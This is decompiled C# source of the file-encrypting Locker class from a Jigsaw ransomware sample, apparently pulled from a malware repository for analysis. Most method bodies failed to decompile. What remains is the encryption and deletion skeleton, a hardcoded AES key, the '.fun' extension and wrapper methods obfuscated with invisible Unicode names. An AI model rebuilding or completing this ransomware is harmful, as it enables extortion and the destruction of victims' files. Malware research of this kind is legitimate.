// Decompiled with JetBrains decompiler
// Type: Main.Tools.Locker
// Assembly: BitcoinBlackmailer, Version=37.0.2.5583, Culture=neutral, PublicKeyToken=null
// MVID: 1950B17F-8BE4-40AB-B698-96070A0C2297
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\Win.Ransomware.Jigsaw-6866216-0-9580e6c4deba3bd46419a402b6309f77c2ed47ad62299c82ec8578400c2a3a64.exe

using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace Main.Tools
{
  internal static class Locker
  {
    private static readonly string EncryptedFileListPath;
    private static readonly HashSet<string> EncryptedFiles;
    private const string EncryptionFileExtension = ".fun";
    private const string EncryptionPassword = "OoIsAwwF23cICQoLDA0ODe==";

    internal static void EncryptFileSystem()
    {
      // ISSUE: unable to decompile the method.
    }

    internal static HashSet<string> GetEncryptedFiles()
    {
      // ISSUE: unable to decompile the method.
    }

    private static string CreateFileSystemSimulation()
    {
      // ISSUE: unable to decompile the method.
    }

    private static IEnumerable<string> GetExtensionsToEncrypt()
    {
      // ISSUE: unable to decompile the method.
    }

    private static IEnumerable<string> GetFiles(string path)
    {
      // ISSUE: unable to decompile the method.
    }

    private static void EncryptFiles(
      string dirPath,
      string encryptionExtension,
      HashSet<string> extensionsToEncrypt)
    {
      // ISSUE: unable to decompile the method.
    }

    internal static void DecryptFiles(string encryptionExtension)
    {
      // ISSUE: unable to decompile the method.
    }

    private static bool EncryptFile(string path, string encryptionExtension)
    {
      // ISSUE: unable to decompile the method.
    }

    private static void DecryptFile(string path, string encryptionExtension)
    {
      // ISSUE: unable to decompile the method.
    }

    private static void EncryptFile(SymmetricAlgorithm alg, string inputFile, string outputFile)
    {
      // ISSUE: unable to decompile the method.
    }

    private static void DecryptFile(SymmetricAlgorithm alg, string inputFile, string outputFile)
    {
      // ISSUE: unable to decompile the method.
    }

    static Locker()
    {
      // ISSUE: unable to decompile the method.
    }

    static DriveInfo[] \u202E⁮‫‏‮⁫⁭‎‭‫‎‌‏‬⁮⁫‪‌‪​‭‬‎⁫⁪‌⁮‬⁪‫‪⁬⁯‪‍⁯‍​⁯‪‮() => DriveInfo.GetDrives();

    static bool \u206E‬‍⁯‮⁪⁪‭‬⁫‍‌‎​‏⁬⁭⁪⁫‫⁬⁯‍‭​⁯⁯⁫‫‬‎‫⁭‭⁬⁫⁬⁪‎‌‮([In] IEnumerator obj0) => obj0.MoveNext();

    static void \u206C⁬‬‭⁪⁭‎‍‌⁭⁫‫‬⁪⁮‮⁯⁯‬⁯⁮‍​⁯​‫⁭‍‌⁯⁮‬‏‭‮⁯⁮‎​‪‮([In] IDisposable obj0) => obj0.Dispose();

    static bool \u202C‏⁫‍​‮‎‍‫‍‏⁮⁯⁭‫⁫‏‏‎⁭⁮‫⁭‬‌‭‮‌‬‬‌‪⁮⁯⁭‎​‮⁬⁭‮([In] string obj0) => File.Exists(obj0);

    static void \u206F⁮‏⁭‎⁯‬⁭⁭⁬‫‎⁮‭⁮⁬⁬‮‌‪‫⁯⁪‍‬‬⁮⁪‎‪⁬‫‫⁯⁪‭⁪‍⁭‏‮([In] string obj0, [In] string[] obj1) => File.WriteAllLines(obj0, obj1);

    static string[] \u206C⁫‪‬⁮​‭‮⁭‬‫‏‍‎‌⁪‍‭‪​⁪‫⁪‎‭‪‬‍⁯‫‍‪​‌⁭⁪‎‏⁭⁫‮([In] string obj0) => File.ReadAllLines(obj0);

    static string \u206F‌⁬‫‏‮⁭⁫⁪‏⁯⁮‪​‬⁫‌‌⁮⁭‬‏⁫⁮⁬⁯‫⁫‮‮⁬‬‍‮‍⁫⁯‏‬‪‮([In] string obj0, [In] string obj1) => Path.Combine(obj0, obj1);

    static bool \u206B⁯‬‮​⁭‍‬‭⁫‍⁪⁬⁯‭⁭⁭⁯⁮‪‍⁮‫‍⁭‭⁯‪⁮‫‭‭‌⁪‏‪⁮‮‍‮([In] string obj0) => Directory.Exists(obj0);

    static DirectoryInfo \u206E‫‌‫‍‬‌⁬‫‮‫‏‫‭⁭‮⁭⁮⁯‭⁫⁬⁭⁬‏⁭⁪‫‭‏‌⁪‎⁪⁫‎‫‬⁮‮‮([In] string obj0) => Directory.CreateDirectory(obj0);

    static StreamWriter \u202D⁭‫‍‮⁮⁫‭⁭‎‏⁬‏⁭‏‌​​⁫‏‭⁯‍⁯‍⁯⁯‫⁮⁬‬‌⁪⁪⁪‬⁬​⁮⁫‮(
      [In] string obj0,
      [In] bool obj1)
    {
      return new StreamWriter(obj0, obj1);
    }

    static void \u200D‌‫‏‬‍‍⁬‪⁮‎‬​⁭‎‫⁬​⁬⁯⁯‏‮‍‎⁪​‏‎⁫‫​⁯⁪​⁫‏‪‫‮([In] TextWriter obj0, [In] string obj1) => obj0.WriteLine(obj1);

    static string \u202D‮‫‮⁬⁯‫‭⁯‫⁭‎‏‮‌‎​⁫⁫⁯‪⁬⁪‫⁭⁯​⁭‫‮‬⁭⁪‫‬⁯‬‎‫⁭‮() => Environment.NewLine;

    static string[] \u206E​‫⁭⁯⁫‬​‬⁯⁭⁫⁯‬⁯‮⁮‪‎⁫⁯‌‏‬⁭‍‮‍‍‪⁮​⁪⁬‫⁫‌⁫‍‮(
      [In] string obj0,
      [In] string[] obj1,
      [In] StringSplitOptions obj2)
    {
      return obj0.Split(obj1, obj2);
    }

    static string \u206A⁮⁭‪‍‮‌‌⁮‎‬‮⁫⁪⁮‎‏‭⁯‏⁬​‍‭⁮‪​​⁪‭‍⁬‬⁫⁪‎⁬⁬⁯‬‮([In] string obj0) => obj0.Trim();

    static string \u200D⁬⁫‭‫‭‮‏‪​‪⁪‌‏⁬‍‭⁭‍​⁫⁭⁬⁯‮⁪​‎‮‪‭​‫⁬​⁫‬‬‎‏‮([In] string obj0, [In] string obj1) => obj0 + obj1;

    static void \u206A‪⁯‏⁪⁬‏‏‍⁫‭⁬⁭​‏⁭⁯‬‍‏‏⁮⁯‌‍⁭‎‪⁫⁪⁪⁬⁪‌⁪‎​‫‪‍‮([In] string obj0) => File.Delete(obj0);

    static bool \u206F⁬⁮​‏‏‌‮​⁭⁪‭⁮‪⁮‬‬‍⁭‎⁫⁬‬⁯‮⁮⁫⁪⁪⁯‌⁯⁭‭‮‫​‫‎‍‮(
      [In] string obj0,
      [In] string obj1,
      [In] StringComparison obj2)
    {
      return obj0.StartsWith(obj1, obj2);
    }

    static AesCryptoServiceProvider \u200F⁮‌‬‎‮‪‌⁯‬‬‌⁯‬‌‏⁭‭⁫‭‮‭‎⁭‍‎‎⁬⁮⁮‭‫⁫⁪‌‍‫‬⁮‭‮() => new AesCryptoServiceProvider();

    static byte[] \u206E‬⁪⁫⁬‎⁭‭⁪‭‮⁯⁮⁬​⁪⁭⁮‎‎‭‬‫‏‌‭⁯‬‌‪‪​⁪⁪‏⁬‪‭​⁯‮([In] string obj0) => Convert.FromBase64String(obj0);

    static void \u200C⁫‪⁯‫‮​⁪‌⁬‎‫⁭​‏⁫⁯‭‎‫⁯‎‍⁪⁬‍‎⁭‍⁬⁮⁭​‏⁯​⁮⁪‮⁭‮([In] SymmetricAlgorithm obj0, [In] byte[] obj1) => obj0.Key = obj1;

    static void \u202A⁫⁭‌⁪⁯‏⁯‪​‍⁯‫‎‭‏‫⁬‍​‍​‫‍⁪‫‌‭‬‍⁯⁭​‬⁬‬‫⁫⁭‏‮([In] Array obj0, [In] RuntimeFieldHandle obj1) => RuntimeHelpers.InitializeArray(obj0, obj1);

    static void \u206A‏‏‎‪⁪⁬‎​‭⁫⁪‭‪​⁭⁮⁮‎‌‭‌‫⁫‌‌‎​⁮‏‎⁪⁬‎‭‪‪⁫⁮‮‮([In] SymmetricAlgorithm obj0, [In] byte[] obj1) => obj0.IV = obj1;

    static bool \u206C‏‬‪⁭‏‮⁭‮⁪​‫‍⁪‫‍‏‫‫‭​​‌‬⁯‪‏‮‪⁪‫⁮‪⁪‌‏‌‍‮‪‮([In] string obj0, [In] string obj1) => obj0.EndsWith(obj1);

    static int \u202A‮⁪‪‍⁪‫‍‪‍​‏‮⁯‌⁯​⁮⁯‬‎‫‬‪‎‭⁭⁮⁮‪⁫​⁪‪‬⁬‬⁭‍‬‮([In] string obj0) => obj0.Length;

    static string \u200C‬⁪⁫​‎‪‪⁮⁯‭​⁬‮‍⁯​⁫​⁯⁫⁮‮‏⁯‫‭‏‍⁯‮​⁬‪⁮‍‮‍‏‮‮([In] string obj0, [In] int obj1) => obj0.Remove(obj1);

    static FileStream \u202E‎‪‭‎⁫⁫‍‍‪‬‭‍⁫⁬⁯⁫‮‬​‫‎‬​⁬⁭‏⁯⁮‎⁯‫‎⁫⁮⁪‮‫⁮⁮‮(
      [In] string obj0,
      [In] FileMode obj1)
    {
      return new FileStream(obj0, obj1);
    }

    static ICryptoTransform \u206B‬⁭⁬‮‌‏⁯⁪‎‫‮‍‎⁮⁫‎⁫‍​‭‎‮⁮‍⁮​⁬‮⁮‍⁭⁭⁯⁭⁫‫‎‭‮(
      [In] SymmetricAlgorithm obj0)
    {
      return obj0.CreateEncryptor();
    }

    static CryptoStream \u200F‫‌‫‪‮‮⁯‮⁬‬‬‏⁭⁭‮‍​‭⁮‭​​‬‬⁪‮⁮‎⁬⁯⁭‍‌‫‍‎​‍⁬‮(
      [In] Stream obj0,
      [In] ICryptoTransform obj1,
      [In] CryptoStreamMode obj2)
    {
      return new CryptoStream(obj0, obj1, obj2);
    }

    static int \u206E‮‍‏​‫​‎⁯‎‫‪‌‌‫‏‮⁮‎‌‏⁯‫‍⁮‬‍‏‮‏​⁫⁯‭‭⁮‎‪⁪‭‮(
      [In] Stream obj0,
      [In] byte[] obj1,
      [In] int obj2,
      [In] int obj3)
    {
      return obj0.Read(obj1, obj2, obj3);
    }

    static void \u206F‍⁬⁪⁫‍‏⁭‎‏​‫⁯⁯‏⁮‭‍⁪‭‎⁮⁪⁫‍‭⁯‫‏‍⁫⁬⁭⁪‍⁪‎⁭​⁬‮(
      [In] Stream obj0,
      [In] byte[] obj1,
      [In] int obj2,
      [In] int obj3)
    {
      obj0.Write(obj1, obj2, obj3);
    }

    static ICryptoTransform \u206A⁭‭⁫‏‭‪⁫‬‮⁫‫⁪‏⁪‭‌⁬‫‌‭⁯⁫⁪‬​‍⁯⁬‍‫‪‎​⁫‍⁭‍‪⁪‮(
      [In] SymmetricAlgorithm obj0)
    {
      return obj0.CreateDecryptor();
    }
  }
}
